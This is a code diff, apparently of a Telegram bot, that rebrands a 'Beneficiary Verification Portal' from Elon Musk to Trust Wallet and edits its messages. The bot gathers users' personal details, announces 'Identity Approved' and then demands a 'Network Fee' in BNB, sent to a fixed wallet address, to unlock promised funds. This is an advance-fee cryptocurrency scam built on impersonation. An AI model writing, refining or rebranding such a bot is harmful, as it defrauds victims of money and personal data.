@@ -60,7 +60,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
 
     await update.message.reply_text(
-        "Welcome to the Elon Musk Beneficiary Verification Portal.\n\n"
+        "Welcome to the Trust Wallet Beneficiary Verification Portal.\n\n"
     "Complete verification to confirm your eligibility and receive your funds.\n\n"
         "Please provide the required information.\n\n"
         "Enter your Full Name:"
@@ -253,11 +253,12 @@ async def admin_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await context.bot.send_message(
     chat_id=user_id,
     text=(
-        "Congratulations...Identity Approved\n\n"
-        f"Network Fee: {PAYMENT_AMOUNT}\n\n"
+        "Congratulations 🎉\n"
+        "Identity Approved\n\n"
+        f"Network Fee:{PAYMENT_AMOUNT}\n\n"
         "This fee is required to process the blockchain transaction and finalize wallet activation, enabling the Send, Receive, Buy, and Sell features.\n\n"
         "Payment Method:\n"
-         "Binance Coin)\n"
+        "(BNB Coin)\n"
         f"Wallet Address:\n`{WALLET_ADDRESS}`\n\n"
         "Transaction ID using:\n"
         "/tx YOUR_TRANSACTION_ID\n\n"
